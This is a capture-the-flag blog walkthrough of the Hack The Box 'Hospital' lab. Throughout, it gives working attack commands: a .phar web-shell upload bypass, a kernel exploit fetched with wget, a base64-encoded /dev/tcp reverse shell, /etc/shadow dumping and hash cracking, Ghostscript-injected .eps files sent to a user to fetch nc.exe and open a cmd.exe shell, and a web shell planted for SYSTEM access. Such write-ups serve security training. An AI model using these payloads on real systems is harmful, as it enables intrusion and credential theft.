---
title: 'HTB - Hospital'
author: paincakes
date: 2024-04-11 20:55:00 +0800
categories: [HTB, Medium]
tags: [Windows, htb-walkthrough]
---


![Box-Info](https://paincakes.sirv.com/Images/HTB/Hospital/info.png)

# Summary
The "Hospital" on Hack The Box was an engaging challenge at the medium difficulty level. The Windows-based machine featured multiple avenues for exploitation. Initially, we navigated through file upload security by leveraging various file extensions to gain a reverse shell. Following this, a kernel-level vulnerability provided the opportunity to escalate privileges and access the credentials stored in the shadow file. Additionally, exploiting a vulnerability in Ghostscript facilitated our initial foothold, while further privilege escalation was achieved by uploading a PHP shell to the root web directory. Each step required careful enumeration and exploitation, ultimately leading to complete control over the machine.

## Scanning with NMAP
As usual starting the box with `nmap` scan,

```
# nmap -sCV -T4 -p- 10.10.11.241 -oN nmap.out                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 18:21 +0545
Nmap scan report for 10.10.11.241
Host is up (0.082s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-05 19:35:22Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-05T19:36:14+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-04-04T16:10:51
|_Not valid after:  2024-10-04T16:10:51
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6616/tcp  open  msrpc             Microsoft Windows RPC
6635/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
9389/tcp  open  mc-nmf            .NET Message Framing
36541/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-05T19:36:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h56m29s, deviation: 0s, median: 6h56m29s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.03 seconds

```

As from the `nmap` result, we can clearly see its an AD challenge from standard `SMB`, `Kerberos` ports. Aside from that we can see there are web applications being hosted on port `443` and `8080`.

## Web Server Enumeration
Lets start by enumerating the Web application on port 80.
![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/1.png)

it was an Webmail login portal, Started testing version enumeration and default credentials, which didn't work, nothing much could be done here. 

So moving on to the port `8080`, There was another login portal, but this one had a registration option as well.

![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/2.png)

Registered my user on this portal and logged in. I could see there was an file upload functionality. So lets get out hand dirty.

![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/3.png)

I tried tried uploading the `php` revere shell and as i guessed it didn't work, Ofcourse it would not be this easy. Tried numerous obfuscation techniques to get the shell uploaded but none of them worked. I researched further on file uploading exploitation can came around with this [blog](https://book.hacktricks.xyz/pentesting-web/file-upload) .  
We could change the extension of our reverse shell code to numerous other extension and after multiple hit and trail, `.phar` extension worked and our reverse shell code got uploaded. 

### Using P0wnyShell
The simple php reverse shell will also work but why not use more advanced, better and eye pleasing revere shell? For that there is an awesome php available called [P0wny](https://github.com/flozz/p0wny-shell) shell. Just rename the shell from .php to .phar. 

Now we need to access the .phar we just uploaded, since the web application didn't show the uploaded file path, i just tried `/uploads/shell.phar` and it worked kekw.
![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/4.png)

We will get a webshell with user `www-data` which really low privileged user. Performing basic Linux enumeration, we could see the Linux kernel being used by the server seemed outdated.

```
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

www-data@webserver:…/html/uploads# uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

### GameOver(lay) Ubuntu Privilege Escalation
Just by searching the exploit for the aforementioned version, we can find that the version is vulnerable and we can escalate our privilege to root level. More about the exploit [here](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

```
www-data@webserver:…/html/uploads# wget http://10.10.14.37:8000/exploit.sh
--2024-04-12 12:01:47--  http://10.10.14.37:8000/exploit.sh
Connecting to 10.10.14.37:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: 'exploit.sh'

     0K                                                       100%  130M=0s

2024-04-12 12:01:47 (130 MB/s) - 'exploit.sh' saved [558/558]

www-data@webserver:…/html/uploads# chmod +x exploit.sh

www-data@webserver:…/html/uploads# ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned

www-data@webserver:…/html/uploads# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

i tried it on our webshell multiple times, but it didnt seem to work at all, thought it was a rabbit hole for second. But there not really any hints how to move further. Maybe it doesn't work on webshells,  therefore i tried spawning a revershell in our local machine.

``` 
# echo 'sh -i >& /dev/tcp/10.10.14.37/4444 0>&1' | base64          
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNDQ0NCAwPiYxCg==

```

```
www-data@webserver:…/html/uploads# echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNDQ0NCAwPiYxCg==' | base64 -d | bash
```

Normal reverse shell payload didn't seem to work so i tried encoding it with base64 and it worked! 

```
# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.241] 6520
sh: 0: can't access tty; job control turned off
$ 
```

Now stabilizing our revershell with `python`, 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg**
```

```
# stty raw -echo; fg  
[1]  + continued  nc -nvlp 4444

www-data@webserver:/var/www/html/uploads$ 
```

I tried re-running the exploit script.. (finger-crossed)

```
www-data@webserver:/var/www/html/uploads$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@webserver:/var/www/html/uploads# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Woohoo it worked! We escalated our privilege to root level access.  The happiness was temporary, there was nothing to move further again. I remembered it was windows machine challenge so getting root in Linux environment meant nothing?? 

This may have been WSL or something, Since this our only foothold till now, i tried enumerating further, and thank goodness i did, when read the content of the `/etc/shadow` file there was encrypted password for the user **drwilliams**.

```
root@webserver:/var/www/html/uploads# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root@webserver:/var/www/html/uploads# 

```

Copied the hash in a file tried using cracking password with `hashcat`.

```
# hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt -a 0
```

```
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

We got our first credentials . **drwilliams:qwe123!@#**

## Initial Access

I tried using the credentials to authenticate to AD but the credentials didn't seem to work there. This credentials had to go somewhere right? Then I remembered we had the Webmaill login portal on port 443. We will be able to login to the portal using the credentials we got before.

![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/5.png)

We can see a message in the inbox from **drbrown** asking for a design file in some `.eps` format and use `ghostscript` to visualize it. Hmmm Interesting. I just searched for ghostscript exploit and there seems to be a command injection vulnerability. More about that [here](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
### GhostScript Command Injection

The direct revershell command mentioned there will not work since this a windows machine, so we have to it manually by injecting commands.

Lets download a `nc.exe` binary which will make our spawning the reverse shell journey easier. We will be hosting the `nc64.exe` binary through the `python` server and download it on the remote windows machine using the `curl` command.

```
# python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.37:8000/nc64.exe -o nc.exe" --filename file.eps
[+] Payload successfully injected into file.eps.
```

Lets send our malicious `.eps` file to **drbrown**, and hope he opens it.
![hospital](https://paincakes.sirv.com/Images/HTB/Hospital/6.png)

We got hit on our `python` http server, which confirms that now the remote machine has our `nc.exe` binary.

```
# python3 -m http.server                                                                                             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.241 - - [12/Apr/2024 13:02:15] "GET /nc64.exe HTTP/1.1" 200 -

```

Now lets generate another infected`.eps` file with command to start a connection using the uploaded `nc.exe` binary.

```
# python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.37 4545 -e cmd.exe" --filename file.eps
[+] Payload successfully injected into file.eps.

```

Before sending the malicious file to our innocent drbrown again, be sure start the `nc` listener on our machine.

```
# nc -nvlp 4545
listening on [any] 4545 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.241] 32752
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>  
```

And here we got the revershell connection on our `nc` listener. Listing the directories be can the **ghostscript.bat** file. Reading content from the file we can find our another pair of credentials. **drbrown:chr!$br0wn**. 
The user flag is present the Desktop Folder of the user **drbrown**. 

```
C:\Users\drbrown.HOSPITAL\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Documents

04/12/2024  07:13 AM    <DIR>          .
04/12/2024  07:13 AM    <DIR>          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/12/2024  07:13 AM            45,272 nc.exe
               2 File(s)         45,645 bytes
               2 Dir(s)   4,183,494,656 bytes free

C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
C:\Users\drbrown.HOSPITAL\Documents>
```

## Privilege Escalation
Using the `crackmapexec` we can see the list the shares which also confirms the validity of the credentials we found on the `ghostscript.bat` file.

We only read access on those which were default shares anyway, also we didn't have access to `winrm` service. We only had access to `rpcclient` which i tried enumerating but still had no idea how to escalate our privilege to Administrator.

```
# crackmapexec smb 10.10.11.241 -u 'drbrown' -p 'chr!$br0wn' --shares  
SMB         10.10.11.241    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drbrown:chr!$br0wn 
SMB         10.10.11.241    445    DC               [+] Enumerated shares
SMB         10.10.11.241    445    DC               Share           Permissions     Remark
SMB         10.10.11.241    445    DC               -----           -----------     ------
SMB         10.10.11.241    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.241    445    DC               C$                              Default share
SMB         10.10.11.241    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.241    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.241    445    DC               SYSVOL          READ            Logon server share 

```

Afters hours and hours of researching and trying every possible way to exploit/escalate privilege nothing helped. I was stuck at this point, with no clue how to move further. 

Guys remember it is really okay to ask for help or read writeups if you are really stuck and not being lazy to move further, helps with your frustration. After reading one walkthough from a fellow hacker, we just upload our P0wnyshell on the `C:\xampp\htdocs` directory and open the shell on the web application.

It was really disappointing for me, i thought it was gonna be an AD challenge looking at the `nmap` result. *sigh* Well whatever, we will need to host the webshell with `python` http server and use curl to download the shell after going to the path `C:\xampp\htdocs`.

```
C:\xampp\htdocs>curl 10.10.14.37:8000/shell.phar -o rev.php
curl 10.10.14.37:8000/shell.phar -o rev.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 20321  100 20321    0     0  75410      0 --:--:-- --:--:-- --:--:-- 75542

C:\xampp\htdocs>

```

Now just access the Web portal and append `/shell.php` on the URL you will get Administrator level webshell, and the rroot flag is on the **Desktop** Folder of the Administrator user.

```
                

        ___                         ____      _          _ _        _  _   
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

DC$@DC:C:\xampp\htdocs# whoami
nt authority\system

DC$@DC:C:\xampp\htdocs# cd C:\\

DC$@DC:C:\# cd Users

DC$@DC:C:\Users# cd Administrator

DC$@DC:C:\Users\Administrator# dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\Administrator

11/13/2023  10:05 PM    <DIR>          .
11/13/2023  10:05 PM    <DIR>          ..
11/13/2023  10:05 PM    <DIR>          .cache
09/07/2023  07:55 AM    <DIR>          .dotnet
09/07/2023  02:39 PM    <DIR>          .ssh
10/27/2023  12:29 AM    <DIR>          3D Objects
10/27/2023  12:29 AM    <DIR>          Contacts
10/27/2023  12:29 AM    <DIR>          Desktop
10/27/2023  12:29 AM    <DIR>          Documents
11/13/2023  07:04 PM    <DIR>          Downloads
09/06/2023  02:46 AM    <DIR>          ExchangeLanguagePack
10/27/2023  12:29 AM    <DIR>          Favorites
10/27/2023  12:29 AM    <DIR>          Links
10/27/2023  12:29 AM    <DIR>          Music
10/27/2023  12:29 AM    <DIR>          Pictures
10/27/2023  12:29 AM    <DIR>          Saved Games
10/27/2023  12:29 AM    <DIR>          Searches
10/27/2023  12:29 AM    <DIR>          Videos
               0 File(s)              0 bytes
              18 Dir(s)   4,166,213,632 bytes free

DC$@DC:C:\Users\Administrator#
```


